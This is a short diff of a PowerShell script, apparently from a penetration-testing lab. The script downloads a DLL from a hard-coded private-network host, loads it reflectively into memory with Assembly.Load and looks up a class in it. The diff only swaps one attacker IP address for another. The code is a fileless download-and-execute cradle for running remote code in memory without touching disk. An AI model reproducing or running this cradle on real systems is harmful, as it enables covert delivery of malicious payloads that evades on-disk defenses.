@@ -1,4 +1,4 @@
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.192/ClassLibrary1.dll')
 
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
